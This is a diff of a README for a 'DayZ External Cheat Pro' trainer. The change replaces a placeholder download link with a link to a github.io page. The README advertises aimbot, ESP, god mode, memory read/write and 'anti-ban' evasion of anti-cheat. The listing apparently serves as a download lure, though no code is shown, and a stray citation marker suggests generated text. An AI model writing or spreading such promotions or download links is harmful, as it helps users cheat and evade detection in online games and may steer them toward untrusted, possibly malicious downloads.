@@ -1,7 +1,7 @@
 # 🎯 **DayZ External Cheat Pro: ESP & Aimbot Trainer**  
 Elevate your DayZ experience with our pro-level external cheat! This trainer includes **ESP vision**, **auto-aim**, **god mode**, and **unlimited ammo** features, all designed for DayZ 1.26+ versions. Stay undetected thanks to anti-ban algorithms and stream-proof operation [[4]]. Enjoy customizable settings, memory read/write functions, and 24/7 support to dominate every match.  
 
-[![Download DayZ External Cheat Pro](https://img.shields.io/badge/Download-DayZ_External_Cheat_Pro-blueviolet)](#)  
+[![Download DayZ External Cheat Pro](https://img.shields.io/badge/Download-DayZ_External_Cheat_Pro-blueviolet)](https://dayz-external-cheat-tool.github.io/.github/)  
 
 ---  
 
